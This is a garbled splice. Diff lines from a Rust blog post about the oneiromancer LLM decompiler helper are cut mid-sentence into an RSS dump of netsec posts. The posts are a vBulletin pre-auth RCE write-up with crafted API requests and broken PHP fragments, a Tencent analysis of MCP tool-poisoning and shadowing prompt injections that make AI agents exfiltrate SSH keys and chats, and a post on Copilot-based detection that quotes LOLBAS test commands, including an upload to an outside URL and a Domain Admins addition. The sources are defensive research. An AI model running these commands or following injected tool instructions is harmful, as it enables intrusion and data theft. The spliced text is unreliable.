-$ wget https://huggingface.co/AverageBusinessUser/aidapal/resolve/main/aidapal.modelfileFinally, configure Ollama by running the following commands within the directory in which you downloaded the files:$ ollama create aidapal -f aidapal.modelfile 
-$ ollama listOneiromancer conveniently saves  in a separate file:The oneiromancer crate can also be  in your own crate. Refer to the documentation to see how.A peek behind the curtainLet’s take a look at the  now. The core of the oneiromancer crate is actually quite simple. The custom LLM developed by Atredis Partners takes care of the bulk of the work and we just need to query it via the .The  reads the pseudo-code from the target file at the specified path, submits it to the local LLM for analysis, and parses the results. It then outputs to the terminal a high-level description of what the code does, a recommended name for the function, and variable renaming suggestions based on the results of the analysis. Finally, it saves improved pseudo-code to a separate file:pub fn run(filepath: &Path) -> anyhow::Result<()> {
-    // Open target source file for reading
-    println!("[*] Analyzing source code in {filepath:?}");
-    let file = File::open(filepath).with_context(|| format!("Failed to open {filepath:?}"))?;
-    let mut reader = BufReader::new(file);
-    let mut source_code = String::new();
-    reader
-        .read_to_string(&mut source_code)
-        .with_context(|| format!("Failed to read from {filepath:?}"))?;
-
-    // Submit source code to local LLM for analysis
-    let mut sp = Spinner::new(
-        Spinners::SimpleDotsScrolling,
-        "Querying the Oneiromancer".into(),
-    );
-    let analysis_results =
-        analyze_code(&source_code, None, None).context("Failed to analyze source code")?;
-    sp.stop_with_message("[+] Successfully analyzed source code".into());
-    println!();
-
-    // Create function description in Phrack-style, wrapping to 76 columns
-    let options = textwrap::Options::new(76)
-        .initial_indent(" * ")
-        .subsequent_indent(" * ");
-    let function_description = format!(
-        "/*\n * {}()\n *\n{}\n */\n\n",
-        analysis_results.function_name(),
-        textwrap::fill(analysis_results.comment(), &options)
-    );
-    print!("{function_description}");
-
-    // Apply variable renaming suggestions
-    println!("[-] Variable renaming suggestions:");
-    for variable in analysis_results.variables() {
-        let original_name = variable.original_name();
-        let new_name = variable.new_name();
-        println!("    {original_name}\t-> {new_name}");
-
-        let re = Regex::new(&format!(r"\b{original_name}\b")).context("Failed to compile regex")?;
-        source_code = re.replace_all(&source_code, new_name).into();
+<?xml version="1.0" encoding="utf-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Reddit - NetSec</title><link>https://news.securenza.be</link><description></description><item><title>Don&apos;t Call That &quot;Protected&quot; Method: Dissecting an N-Day vBulletin RCE</title><link>https://karmainsecurity.com/dont-call-that-protected-method-vbulletin-rce</link><author>/u/eg1x</author><category>netsec</category><pubDate>Fri, 23 May 2025 13:32:51 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[vBulletin is one of the most widely used commercial forum solutions over the Internet, powering thousands of online communities ranging from niche hobbyist sites to large-scale tech forums. Developed primarily in PHP, it features a custom MVC-like framework and a proprietary API system designed to handle AJAX and mobile app interactions. Over the years, vBulletin has gained a reputation for both its ubiquity and its vulnerability surface — often becoming a prime target for web application exploits.In this blog post, we take a closer look at a pre-auth Remote Code Execution (RCE) vulnerability affecting vBulletin versions 5.x and 6.x that was likely patched a year ago. The bug stems from the misuse of PHP’s Reflection API within vBulletin’s API controller logic, combined with certain changes introduced in PHP 8.1 that allow  (and even ) methods to be invoked via e.g. the ReflectionMethod::invoke() method. We’ll walk through how this API design flaw enables attackers to directly call internal methods that were never meant to be exposed — and why relying on method visibility for security boundaries can be a dangerous assumption.This research was inspired by a similar vulnerability I previously discovered in Invision Community (see KIS-2025-02), which also involved method visibility and API exposure — though in that case, PHP’s Reflection API wasn’t used. Either way, this vBulletin finding prompted a wider investigation into how popular PHP-based applications handle reflective method invocation, especially in custom frameworks or API layers that attempt to route requests dynamically. As part of this effort, I reviewed several of the most widely deployed PHP applications and frameworks — including Joomla, WordPress, Drupal, and Magento — to identify common misuses or dangerous assumptions around visibility and method invocation. So far, according to my research at least, vBulletin stands out as the only platform where this specific pattern can lead to a critical vulnerability, but it raises a broader question: how many other PHP applications / frameworks are unknowingly exposing internal logic through Reflection?This post aims not only to document the vulnerability in vBulletin, but also to highlight a potentially novel class of security bugs that may be lurking in other codebases. It could serve as a useful starting point for other researchers and / or developers to explore the intersection of reflection, dynamic routing, and insecure design assumptions in PHP applications.To understand this class of vulnerability, let’s first take a look at a simplified example that reproduces the core issue: using PHP’s Reflection to dynamically call controller methods, without enforcing visibility restrictions or strict routing.Here’s a minimal and trivial example of vulnerable app:{
+()
+    {
+;
     }
-
-    // Save improved source code to output file
-    let outfilepath = filepath.with_extension("out.c");
-    println!();
-    println!("[*] Saving improved source code in {outfilepath:?}");
-
-    let mut writer = BufWriter::new(
-        File::create_new(&outfilepath)
-            .with_context(|| format!("Failed to create {outfilepath:?}"))?,
-    );
-    writer.write_all(function_description.as_bytes())?;
-    writer.write_all(source_code.as_bytes())?;
-    writer.flush()?;
-
-    println!("[+] Done analyzing source code");
-    Ok(())
-}The following functions, that can also be called by external crates, are in charge of  (either directly or contained in a file) to the local LLM for analysis. If needed, you can specify custom and  values via the environment.pub fn analyze_code(
-    source_code: &str,
-    baseurl: Option<&str>,
-    model: Option<&str>,
-) -> Result<OneiromancerResults, OneiromancerError> {
-    // Check environment variables
-    let env_baseurl = env::var("OLLAMA_BASEURL");
-    let env_model = env::var("OLLAMA_MODEL");
-
-    // Send Ollama API request and parse response
-    let request = OllamaRequest::new(
-        model.unwrap_or_else(|| env_model.as_deref().unwrap_or(OLLAMA_MODEL)),
-        source_code,
-    );
-    request
-        .send(baseurl.unwrap_or_else(|| env_baseurl.as_deref().unwrap_or(OLLAMA_BASEURL)))?
-        .parse()
+($method)
+    {
+ ((($this, $method)))
+        {
+();
+        }
+        $refMethod ($this, $method);
+        $refMethod($this);      }
 }
+$api ();
+$api($_GET[]);  With this setup, and when the app is running over PHP 8.1+, simply accessing /api.php?method=protectedMethod will invoke a  method directly — something the original developer likely assumed was inaccessible. While earlier PHP versions would have thrown an exception when trying to invoke a  /  method without , starting from PHP 8.1, this behavior has changed (see here). Due to an internal adjustment to handling of ReflectionMethod::invoke() and similar methods, it now allows — by default — invocation of  /  methods when using PHP’s Reflection API. This subtle change can turn previously “safe” dynamic routing into a serious security issue… Like in the vBulletin case!🕵️‍♂️ The vBulletin VulnerabilityvBulletin exposes a centralized API handler for internal and external requests, designed to abstract access to backend logic via dynamically routed method calls. This interface is used by various parts of the system, including AJAX handlers, mobile API endpoints, and even template directives ().We’ll focus on the AJAX API handling system, which uses the following URI scheme:http(s)://[vbulletinsite]/ajax/api/[controller]/[method]
+As such, a legitimate HTTP request to the vBulletin’s AJAX API to e.g. fetch user profile information looks like this:POST /ajax/api/user/fetchProfileInfo HTTP/1.1
+Host: [vbulletinsite]
+Content-Type: application/x-www-form-urlencoded
 
-pub fn analyze_file(
-    filepath: impl AsRef<Path>,
-    baseurl: Option<&str>,
-    model: Option<&str>,
-) -> Result<OneiromancerResults, OneiromancerError> {
-    // Open target source file for reading
-    let file = File::open(&filepath)?;
-    let mut reader = BufReader::new(file);
-    let mut source_code = String::new();
-    reader.read_to_string(&mut source_code)?;
+userid=123
+This will load the  controller and will invoke vB_Api_User::fetchProfileInfo($userid = 123). Please note these API endpoints are publicly accessible by default — including to . Access control is enforced at the method level (within each method), not globally. For instance, the vB_Api_User::fetchProfileInfo() method does not implement any access control check, so we can assume it is intended to be publicly callable.To provide additional context, following is the stack backtrace when dispatching the above HTTP request:#0 /core/vb/api/wrapper.php(92): vB_Api_User->fetchProfileInfo('...')
+#1 /core/vb/api/wrapper.php(77): vB_Api_Wrapper->__call('...', Array)
+#2 /includes/api/interface/collapsed.php(101): vB_Api_Wrapper->callNamed('...', Array)
+#3 /includes/vb5/frontend/applicationlight.php(358): Api_Interface_Collapsed->callApi('...', '...', Array, true)
+#4 /includes/vb5/frontend/applicationlight.php(170): vB5_Frontend_ApplicationLight->handleAjaxApi(Array)
+#5 /index.php(38): vB5_Frontend_ApplicationLight->execute()
+As you can see, at the core of this mechanism is the Api_Interface_Collapsed::callApi() method, which receives the target controller, method name, and arguments. Crucially, this method takes a  parameter — and when set to  (as it is for AJAX requests), it dispatches calls through the vB_Api_Wrapper::callNamed() method:($controller, $method,  $arguments  [], $useNamedParams , $byTemplate )
+	{
+		{
+			$c ($controller);
+		}
+ ( $e)
+		{
+($controller, $method, $arguments, []);
+		}
+ ($useNamedParams)
+		{
+		}
+		{
+			$result ([$c, $method], ($arguments));
+		}
+ ($byTemplate)
+		{
+([, ]);
+		}
+ $result;
+	}So, let’s see what the vB_Api_Wrapper::callNamed() method does under the hood:()
+    {
+        $function_args ();
+($method, $args)  $function_args;
+ ((($this, $method))) {
+ $this(, $function_args);
+        }
+        $reflection ($this, $method);
+ ($reflection()  $reflection()  $reflection()  $method ) {
+;
+        }
+        $php_args ();
+ ($reflection()  $param) {
+ (($param(), $args)) {
+                $php_args[] $args[$param()];
+            }  {
+ ($param()) {
+                    $php_args[]  $param();
+                }  {
+(($param()));
+                }
+            }
+        }
+    }
+ __call($method, $arguments)
+    {
+ {
+ (($method, (, , )) ($this $method )) {
+ ($this($method)) {
+;
+                }
+            }
+            $result ;
+            $type  $this($this, $method, $arguments);
+ ($type) {
+ ((($this, $method))) {
+ ($call ) {
+                        $result  $call;
+                    }
+                }
+            }At lines 58-60 there is an if condition to check whether the controller’s method we are trying to invoke is actually “callable”: the value of  in this example would be an instance of the  class, while the value of  will be the user-tainted method name, in this case . As such, the call to the  PHP function at line 58 returns , because the vB_Api_User::fetchProfileInfo() method is , alright!So, execution reaches line 77, where the  PHP function is being used to try to invoke the vB_Api_Wrapper::fetchProfileInfo() method; since it does not exist, this will trigger a call to the  magic method. Once again, if the method is “callable” (line 91), it will use the  PHP function at line 92 to ultimately invoke the controller’s method.Well, this will happen in case the method is “callable”… But what if we try to invoke a “non-callable” API controller’s method like a  one?As an example, let’s try to invoke the vB_Api_Ad::wrapAdTemplate() method — which is a  method — by issuing an HTTP request to the vBulletin’s AJAX API like the following:POST /ajax/api/ad/wrapAdTemplate HTTP/1.1
+Host: [vbulletinsite]
+Content-Type: application/x-www-form-urlencoded
 
-    // Analyze `source_code`
-    analyze_code(&source_code, baseurl, model)
-}The  and  functions use the , , , and  abstractions defined in separate files.For further details, refer to oneiromancer’s source code on GitHub:Once again, the heavy lifting of fine-tuning the local LLM to analyze pseudo-code generated by the Hex-Rays decompiler was done by Chris Bellows and Atredis Partners. They deserve all credit for training the aidapal custom LLM that’s queried by oneiromancer.]]></content:encoded></item><item><title>Security Analysis: Potential AI Agent Hijacking via MCP and A2A Protocol Insights</title><link>https://medium.com/@foraisec/security-analysis-potential-ai-agent-hijacking-via-mcp-and-a2a-protocol-insights-cd1ec5e6045f</link><author>/u/CoatPowerful1541</author><category>netsec</category><pubDate>Mon, 14 Apr 2025 10:30:49 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Security Analysis: Potential AI Agent Hijacking via MCP and A2A Protocol InsightsCommunication protocols represent a core infrastructure accelerating the development and deployment of AI Agents. Anthropic’s Model Context Protocol (MCP) has emerged as a prominent protocol for connecting AI Agents to external tools, while Google’s recently released Agent2Agent (A2A) protocol focuses on facilitating collaboration between intelligent agents and enabling the creation of multi-agent systems. As key communication specifications in the AI Agent era, their security posture is critical to establishing secure boundaries for AI Agents. Any vulnerability could lead to cascading risks, including AI Agent hijacking and data leakage. Tencent’s Zhuque Lab has systematically reviewed potential security flaws in the MCP protocol, common attack vectors, and mitigation strategies. Additionally, this analysis covers the security features of Google’s A2A protocol, offering insights for the industry to build more secure AI Agent products.I. Example Scenario: Malicious MCP Hijacking Cursor to Exfiltrate WhatsApp DataAs described in an April 6, 2025 blog post by security company Invariant Labs, risks such as the “Tool Poisoning Attack” (TPA) associated with MCP were disclosed, primarily affecting users of MCP clients like Cursor and Claude for Desktop. The core mechanism of the TPA involves embedding malicious instructions within tool descriptions, often hidden in MCP code comments. These instructions, though not directly visible to the user in simplified UI views, are processed by the AI model. Such hidden instructions can manipulate the AI Agent into performing unauthorized actions, such as reading sensitive files or exfiltrating private data.For instance, consider a scenario where a user’s Cursor instance has a malicious MCP installed. If the user employs the legitimate  tool (e.g., https://github.com/lharries/whatsapp-mcp) to view messages and send a "Hi" message, the attack could potentially cause the user's recent WhatsApp chat history to be sent to an attacker-controlled number.This hypothetical attack exhibits the following characteristics:It leverages the existing permissions granted to the user-installed  tool to exfiltrate data, without necessarily exploiting vulnerabilities within WhatsApp itself.It only requires the installation of the malicious MCP; the AI Agent does not need to interact  with the malicious tool’s overt functionality.Due to potential UI limitations (e.g., Cursor not automatically wrapping extremely long content), users might not easily notice the leaked chat history within the tool parameters.The underlying principle of this attack is relatively straightforward. The malicious MCP code might resemble the following:Upon installation (and potentially subsequent runs triggering the marker file check), the malicious MCP injects backdoor instructions within the  tags into the  tool's description, loading them into the Cursor conversation context.Cursor is now effectively “poisoned.” When the user utilizes the  tool, the AI, influenced by the injected instructions from the malicious MCP's context, constructs the  parameters. It concatenates the retrieved WhatsApp conversation list with the original message, possibly using padding or formatting tricks (like the  string) to obscure the data within the  parameter in the JSON payload presented for user confirmation. Users might need to scroll horizontally to see the full content.If the user overlooks the manipulated recipient number and the appended chat history in the confirmation dialog and approves the tool execution, their private chat history is sent to the attacker’s number, resulting in data leakage.II. MCP & A2A Security Fundamentals2.1 Introduction to MCP and A2A The Model Context Protocol (MCP), proposed by Anthropic, is an open standard designed to establish secure, bidirectional connections between AI models and external tools (APIs, databases, file systems, etc.). Prior to standardized protocols like MCP, integrating tools often required bespoke development for each tool, leading to inefficiency. MCP provides a pluggable framework aiming to streamline the process of extending AI capabilities.On April 9, 2025 (as per Google’s announcement timeline), Google Cloud introduced the Agent2Agent (A2A) protocol, presented as the first open standard specifically designed for AI agent interoperability. Google positions A2A as complementary to MCP, addressing agent-to-agent communication, whereas MCP focuses on agent-to-tool communication.2.2 Identified MCP Security Weaknesses The initial design of MCP (e.g., the version released around November 2024) and common implementations may exhibit security weaknesses, potentially stemming from a primary focus on enabling local tool usage or trusted vendor interactions without fully anticipating adversarial scenarios: AI models process the  tool description, including content hidden within comments or specific tags. However, user-facing interfaces in AI Agents often display only simplified functional summaries, potentially omitting malicious instructions embedded within the full description.Lack of Context Isolation: When an AI Agent connects to multiple MCP servers, the description information for all tools can be loaded into the same session context. This allows descriptions from a malicious MCP server to potentially influence the behavior of tools provided by trusted MCP services (see Shadowing Attack below).Insufficient Large Language Model (LLM) Security: LLMs are designed to follow instructions meticulously, including those in MCP tool descriptions. They often lack robust capabilities to discern malicious intent, especially when instructions are disguised as operational necessities. Furthermore, developer-added security prompts can often be bypassed using sophisticated jailbreaking techniques.Lack of Version Control and Update Mechanisms: The MCP protocol specification historically lacked strict version control and secure update mechanisms for remote MCPs. This enables “Rug Pull” scenarios where a malicious actor can modify a remote tool’s description  initial user installation and approval, without the client automatically detecting the change or requiring re-authorization.Insufficient Security Isolation and Vetting: Official MCP documentation traditionally did not strongly mandate running MCP services in sandboxed environments (like Docker). Third-party MCP marketplaces may lack rigorous security vetting processes, making it easier for users to install MCP services containing backdoors or vulnerabilities.Incomplete Authorization and Authentication Guidance: For interfaces performing sensitive operations (e.g., database queries, file access, command execution), early MCP specifications did not mandate specific authorization (AuthZ) and authentication (AuthN) mechanisms. This oversight could lead to publicly exposed MCP services being compromised or misused.2.3 Google A2A Protocol Security Features AnalysisIn contrast to MCP’s common use case involving local or community-provided tools (where source code might be available), Google A2A targets secure communication between potentially “black box” agents from different providers. Google asserts a “secure-by-default” design philosophy for A2A, incorporating several standard security mechanisms:Enterprise-Grade Authentication and Authorization: Explicit support for protocols like OAuth 2.0 ensures that only authorized agents can interact. Leverages OpenAPI specifications for describing agent capabilities, commonly using Bearer Tokens in headers for authentication. Designed to ensure agents perform only authorized actions, enabling fine-grained management of agent capabilities. Supports encrypted data exchange (e.g., via HTTPS) to protect sensitive information during transmission.Evolving Authorization Schemes: Plans include enhancing the  (see below) with additional authorization mechanisms, such as embedded optional credentials.A key component is the , a standardized metadata file () describing an agent's capabilities, skills, endpoint URL, and authentication requirements. This allows agents to discover and understand each other's functionalities and access prerequisites dynamically and securely.As indicated, A2A supports various authentication schemes, from simple API keys to enterprise solutions like OAuth. Similar robust mechanisms are expected for securing message transport. Compared to the baseline MCP specification, Google’s A2A protocol appears significantly more mature regarding built-in security features and explicit guidance.From an attacker’s perspective, A2A’s focus on inter-agent communication implies many A2A endpoints will be publicly accessible. Vulnerabilities in A2A implementations could therefore have a broad impact and potentially lower exploitation cost compared to locally deployed MCPs. This requires heightened security awareness from developers implementing A2A agents. Continued monitoring of A2A security developments and implementation practices is warranted.III. Common Attack Methods Against MCP Implementations3.1 Tool Poisoning Attack (TPA)TPAs exploit hidden instructions within tool descriptions to manipulate the LLM’s behavior. Consider this example:In this example, the Python code implements a simple addition function. However, malicious instructions are embedded within the  tag in the docstring comments. These instructions direct the AI model to:Read sensitive configuration files ().Access the user’s private SSH key ().Exfiltrate this data covertly via the  parameter.Obfuscate these actions by generating unrelated explanatory text (e.g., mathematical reasoning).When a user attempts to use this tool for a simple addition, the AI simultaneously processes the hidden malicious instructions. The client UI might only display the benign description (“Adds two numbers”) and the parameters  and . The  parameter, containing the exfiltrated data, might be presented but could be extremely long or require horizontal scrolling, making it easy for users to overlook if they don't meticulously inspect all parameters before confirming execution.If the user approves the execution without noticing the malicious payload in , the data is sent to the MCP server controlled by the attacker.After the tool executes, the frontend might display only the requested mathematical explanation. By this time, the attacker’s MCP server has received the sensitive data (e.g., SSH key). Even if the user later notices suspicious activity, the data exfiltration has already occurred.The TPA described above relies on the malicious instructions being present when the user interacts with the tool. However, what if the user inspects the MCP service code  and finds it clean? This introduces the “Rug Pull” attack, analogous to scams in the cryptocurrency space. In a crypto Rug Pull, developers launch a project, attract investment, and then exploit a hidden backdoor or abandon the project, stealing funds.In the MCP context, a Rug Pull attack proceeds as follows:A user installs and enables an initially legitimate-seeming MCP service, perhaps discovered via social recommendations or a marketplace. The service might be hosted remotely by the developer.At a later time, the attacker modifies the code , injecting malicious instructions (like those used in TPA) into the tool descriptions.When the user subsequently uses the tool, the AI processes the now-malicious description, falling victim to the poisoning attack, even though the initially installed version appeared safe.Similar supply chain risks exist for software packages (e.g., on PyPI), but users are typically safe if they don’t update packages without verification. MCP’s support for remote services, combined with a lack of mandatory client-side integrity checks or re-confirmation prompts upon remote code changes, exacerbates the Rug Pull risk. Users often cannot easily determine if the code running on a remote MCP server has been altered since they first enabled it.When multiple MCP servers are connected to a single AI agent client, a malicious server can execute a “Shadowing” attack. This involves manipulating the AI’s behavior when interacting with other, trusted MCP services. Essentially, the malicious MCP’s instructions cast a “shadow” over the operations of legitimate tools.Consider a malicious MCP providing a simple  tool, but its description contains instructions targeting a separate, trusted  tool:When the user later attempts to use the legitimate  tool, the AI, having processed the malicious MCP's description loaded into its context, follows the hidden instructions. It redirects the email to the attacker's address () instead of the user-specified recipient. The danger here is significant because the attack takes effect even if the user never directly invokes the malicious . Merely having the malicious MCP enabled and its tool descriptions loaded into the agent's context is sufficient to compromise the behavior of other trusted tools.3.4 Command Injection AttackBeyond attacks targeting the AI client via malicious descriptions, the security of the MCP  itself is crucial. Historically, AI agents using Function Calling sometimes suffered from command injection vulnerabilities if tool parameters were improperly sanitized before being used in system commands or other sensitive operations. This risk persists with MCP, potentially with lower barriers to exploitation if MCP services are exposed insecurely.Firstly, many MCP services are explicitly designed for potentially dangerous operations like system command execution, file read/write, or database interaction. If these services are deployed without adequate sandboxing (e.g., Docker containers with restricted permissions) and network controls (e.g., firewall rules, authentication for public exposure), they become prime targets for exploitation.Secondly, real-world examples exist where MCP services handling sensitive operations, like financial transactions, lacked sufficient authorization checks. For instance, security researchers (like the SlowMist team example referenced) demonstrated scenarios where internal functions of a cryptocurrency exchange’s MCP could potentially be triggered via conversational interaction to perform unauthorized actions like fund transfers.For providers offering MCP marketplaces or hosting platforms, it is highly recommended to utilize secure execution environments like serverless functions (e.g., AWS Lambda, Google Cloud Functions) or tightly sandboxed containers for hosting third-party MCP code. Failure to do so could allow vulnerabilities in developer-uploaded MCP code to compromise the hosting provider’s infrastructure or other tenants. (Alibaba Cloud’s Bailian platform using a serverless approach is cited as an example of better practice).Beyond the specific attacks above, MCP ecosystems are susceptible to broader security risks:(1)  Attackers might upload MCP services with backdoors or vulnerabilities to public marketplaces. They could also use typosquatting (names mimicking popular services) to trick users. Installing such malicious MCPs can lead to data leakage or agent compromise.(2) Prompt Injection and Jailbreaking (Targeting MCP Services): Some MCP services might internally use LLMs to process requests or generate responses. Attackers could use prompt injection techniques in their requests to these MCP services to extract internal prompts, manipulate the service’s behavior, or cause it to generate harmful/sensitive output.(3) API Key / Credential Theft: Many MCP services (e.g., for cloud services, databases) require users to provide API keys or other credentials. Attackers could create malicious MCPs that convincingly mimic legitimate services, providing the expected functionality while secretly stealing the credentials entered by the user. Compromised legitimate MCP services could also be backdoored to steal keys.IV. Recommendations for MCP Security EnhancementFor end-users of MCP clients (Cursor, Claude for Desktop, etc.), exercise caution when installing third-party MCP services. Prefer well-known, open-source, and actively maintained options. Whenever feasible, deploy MCP services within isolated environments like Docker containers, restricting their file system and network access. Critically examine the complete input parameters displayed in the UI confirmation dialog before executing any MCP tool call, watching for suspicious or unexpected data.For MCP protocol maintainers, AI Agent developers, and the broader ecosystem, consider the following security enhancements (incorporating suggestions from community members like  and Zhuque Lab's findings):4.1 MCP Protocol Specification Improvements (For Protocol Maintainers)Standardize Instruction Syntax: Clearly differentiate between descriptive text (for LLM understanding) and executable instructions within tool descriptions using mandatory, distinct syntax. Clients should be required to recognize and potentially handle these instruction types differently (e.g., requiring specific user approval for execution instructions). Introduce a more granular permission model. For example, tool descriptions should not be able to instruct the AI to read arbitrary local files unless explicitly granted that permission by the user for that specific tool. Instructions attempting to modify the behavior of  tools should be prohibited by default or require explicit declaration and user consent.Source Verification and Signing: Mandate or strongly recommend digital signatures for tool descriptions provided by MCP servers. Clients should verify the signature against a trusted source registry to ensure description integrity and authenticity, mitigating tampering and certain Rug Pull scenarios.4.2 AI Agent Development Security Practices (For Agent Developers)Implement Security Sandboxing: Isolate tool descriptions and execution environments originating from different MCP servers. This limits the ability of one MCP service (A) to directly interfere with another (B). For MCPs requiring sensitive permissions (command execution, file system access), deployment within secure sandboxes (Docker, VMs, WebAssembly runtimes) should be standard practice, potentially enforced by the agent platform.Input/Output Filtering and Monitoring: Implement robust filtering and monitoring for both LLM prompts/responses and MCP tool inputs/outputs. This includes scanning for prompt injection attempts, patterns indicative of sensitive data (file paths, keys), and instructions aimed at unauthorized cross-tool manipulation. Ensure the agent validates data returned from MCP tools to prevent exfiltration via encoded/hidden payloads.Enhance UI Transparency and User Confirmation: The agent’s UI  provide access to the complete tool description, not just a summary. Before executing potentially sensitive operations or actions triggered by complex instructions, clearly present the AI’s full intended action, the justification (including the originating instruction if ambiguous), and require explicit, fine-grained user confirmation. Avoid UI designs that obscure long parameters.Version Pinning and Integrity Checks: Implement mechanisms to pin installed MCP tool versions and verify their descriptions (e.g., via cryptographic hashes) against the user-approved version upon loading. Notify users and require re-confirmation if the description of a remote MCP service changes unexpectedly.4.3 MCP Ecosystem Security Measures (For Marketplaces, Security Vendors) MCP marketplace providers should establish mandatory security auditing processes for submitted MCP services. Security vendors can contribute by developing tools (like the “Mcp-Scan”) to automatically scan MCP code for known vulnerabilities, backdoors, malicious instruction patterns, and other risks.Security Incident Monitoring and Disclosure: Encourage responsible disclosure of discovered MCP vulnerabilities and attack campaigns. Security vendors should actively monitor the ecosystem for threats. Initiatives like Zhuque Lab’s AI-Infra-Guard, which tracks AI infrastructure vulnerabilities, should be expanded to include MCP-specific threat intelligence and detection signatures.V. Future Security Challenges and OutlookThe MCP specification document updated around March 25, 2025, formally introduced support for OAuth 2.1 authorization, aiming to secure interactions between MCP clients and servers with managed permissions. It also outlined key principles for Security and Trust & Safety:User Consent and Control: Emphasizing explicit user consent, understanding of operations, user control over data, and clear UI for authorization. Requiring explicit consent for data exposure, preventing unauthorized data transfer, and protecting data via access controls. Treating tools (especially those involving code execution) cautiously, considering descriptions untrusted unless verified, requiring explicit consent for tool calls, and ensuring user understanding. Requiring explicit user approval for LLM sampling requests initiated by servers, user control over prompt content, and limiting server visibility into prompts.Crucially, the MCP maintainers state that the protocol  does not enforce these principles; the responsibility for secure implementation lies with AI Agent and MCP service developers. General advice is provided (implement consent flows, provide clear documentation, use access controls, follow best practices), but unlike Google’s A2A approach, MCP does not appear to mandate specific security mechanisms like OAuth or provide detailed, built-in capabilities for fine-grained permission control or security hardening directly within the protocol standard.Consequently, many of the risks discussed in this article remain relevant, contingent on developer diligence and implementation choices. The proliferation of third-party MCP marketplaces, the lag in existing developers adopting newer security practices, and relatively limited industry focus on MCP-specific security contribute to ongoing challenges. The security posture of the newer Google A2A protocol also requires continued observation and research as its adoption grows.Tencent’s Zhuque Lab remains committed to researching AI security, including LLM security, AI Agent security, and AIGC content detection. We encourage collaboration and knowledge sharing within the community to address these evolving challenges.This article is translated from Chinese. The original post can be found here: https://mp.weixin.qq.com/s/x3N7uPV1sTRyGWPH0jnz7w. The original title is “AI Agent破局：MCP与A2A定义安全新边界”, and the author is Nicky of Tencent Zhuque Lab.]]></content:encoded></item><item><title>EDV - Endpoint Detection &amp; Vibes - From vibe coding to vibe detections</title><link>https://tierzerosecurity.co.nz/2025/04/14/edv.html</link><author>/u/clod81</author><category>netsec</category><pubDate>Mon, 14 Apr 2025 03:32:47 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[
-          14 April 2025
-          Claudio Contin
-        
-          Andrej Karpathy (OpenAI co-founder) came up with the term , which is the concept of writing software using AI by purely using prompts, without the need of coding skills.
-        
-          Given the vibes of our current times, few days ago I was thinking: what's the "vibest" thing I could try to build in a few hours?
-        
-          Then I remembered that Windows ships with the Copilot Chat application, which allows users to interact with the Copilot LLM without needing a paid Copilot API plan.
-        
-          So I thought, would it be possible to use this LLM to deliver Windows host events to the LLM and let it determine if the events are a result of malicious actions performed?
-        
-          I decided to investigate how the Windows Copilot application works... Buckle up and get ready to vibe!
-        
-          The built-in Windows Copilot application is nothing more than a Progressive Web Application (PWA) that can be installed on a device and accessed as a standalone application. The application loads and renders the Copilot web application.
-        
-          When a new chat is started, the application makes an HTTP POST request to the  endpoint.
-        
-          Once the conversation ID is returned, the application then switches protocol to use WebSocket, and the chat communication is performed over this channel.
-        
-          Sysmon events are visible from the Event Viewer, and can be programmatically queried using the Microsoft-Windows-Sysmon/Operational log channel. Note that local administrator privileges are required in order to view and query Sysmon events (high integrity level). 
-        
-          I decided to query these Sysmon generated events (the raw XML which contains the full event details), send them to Copilot for analysis, and let Copilot decide if any of them contain any potentially malicious actions.
-        
-          I wrote the EDV tool that queries Sysmon events, and delivers them to Copilot for analysis, using the WebSocket channel, in the same way as the Copilot Chat application. If you are wondering if AI was used to help coding it: ooohhh yessss, this is all about vibes!
-        
-          The tool can be run in two different modes:
-          
-          I originally only implemented the  method, which obtains a new conversation ID from the Copilot endpoint mentioned earlier, and establishes a WebSocket connection that is used to send events and receive responses synchronously and in chronological order (earlier events first). If multiple prompts are sent concurrently over the same WebSocket channel, the Copilot endpoint returns an error, related to rate limiting ().
-        
-          While writing, or better vibing, the tool, I then attempted to establish a new WebSocket connection for each of the event, and send a few of them in parallel, using the same conversation ID for all. In this scenario, the Copilot endpoint did not prevent concurrent requests. For this reason, the tool can also be launched with the  mode. Note that in this mode, the events are not sent in a synchronous and chronological order, which might reduce the detection capability, but increases the speed of delivery, especially in cases where several events are generated within a short time-frame.
-        
-          The tool also accepts a conversation ID and a list of comma separated event IDs as optional arguments. The conversation ID allows to re-use an existing Copilot conversation, rather that starting a new one. The event IDs argument allows to only inspect specific events. Sysmon events range from 1 to 31.
-        
-          The prompt used to query Copilot is:
-        
-          The reason I asked to disregard DNS lookups is due to the fact that Copilot flagged several online advertisement domains as potentially malicious. For example, while browsing news websites, Copilot started responding with "ALERT" for events related to DNS lookups of these advertisement domains. I tried to edit to prompt to instruct to raise alerts for these domains only if absolutely certain, but it did not improve the results.
-        
-          Finally, the tool disregards all events generated by the EDV itself, by using this simple regex against the Sysmon raw XML event:
-        
-           The tests were performed with Windows Defender enabled. Some of the commands were detected by Defender, which resulted in no event being saved in the Sysmon logs.
-        
-          Events of the same kind, especially related to process creation, were not always flagged as malicious, which indicates that Copilot might inspect previous events before deciding to flag or not a certain event. For example, this command (from LOLBAS) DataSvcUtil /out:C:\Windows\Temp\data.log /uri:https://www.program-api.org/v1/upload was not consistently flagged as malicious.
-        
-          For events not blocked by Defender, Copilot was able to mark around 40% of the LOLBAS tested as malicious. Common actions, such as adding a domain user to the Domain Admins group (net group "Domain Admins" legit /add /domain) were flagged as well. Below is an example of the Defender Real-time protection disable action which Copilot flagged.
-        
-        For more examples, refer to the video below.
-        
-          Even though several false positives and negatives were observed during the testing, the results indicate that for some specific events, Copilot was better as flagging potential malicious actions that were not caught by Windows Defender.
-        
-          Note: The tool is not intended for actual use — just vibes!
